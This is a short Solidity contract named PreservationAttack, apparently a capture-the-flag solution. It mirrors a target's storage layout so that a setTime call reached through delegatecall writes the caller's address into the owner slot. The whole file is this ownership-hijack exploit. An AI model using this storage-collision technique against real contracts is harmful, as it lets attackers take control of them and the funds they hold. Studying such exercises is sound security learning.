// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

contract PreservationAttack {
    address public slot0;
    address public slot1;
    address public owner; // slot2
    uint slot3;

    function setTime(uint _time) public {
        owner = msg.sender;
    }
}
